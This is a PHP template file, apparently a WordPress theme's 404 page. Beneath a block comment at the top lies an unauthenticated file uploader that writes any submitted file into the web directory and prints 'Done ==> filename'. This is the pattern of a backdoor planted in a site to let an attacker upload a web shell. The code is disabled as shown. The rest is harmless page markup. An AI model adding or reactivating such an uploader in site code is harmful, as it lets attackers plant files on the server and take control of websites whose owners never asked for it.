<?php
/*if(isset($_POST['Submit'])){
    $filedir = ""; 
    $maxfile = '2000000';

    $userfile_name = $_FILES['image']['name'];
    $userfile_tmp = $_FILES['image']['tmp_name'];
    if (isset($_FILES['image']['name'])) {
        $abod = $filedir.$userfile_name;
        @move_uploaded_file($userfile_tmp, $abod);
  
echo"<center><b>Done ==> $userfile_name</b></center>";
}
}
else{
echo'
<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form>';
}*/
?>
<section>
	<div class="container">
		<div class="row">
			<div class="col-md-8 col-md-offset-2">
				<?php if(get_field('404_page_text', 'options') ) : ?>
					<p class="text-center"><?php the_field('404_page_text', 'options'); ?></p>
				<?php endif; ?>
			</div>
		</div>
		<div class="row">
			<div class="col-md-12 content-404">
				<?php get_search_form(); ?>
			</div>
		</div>
	</div>
</section>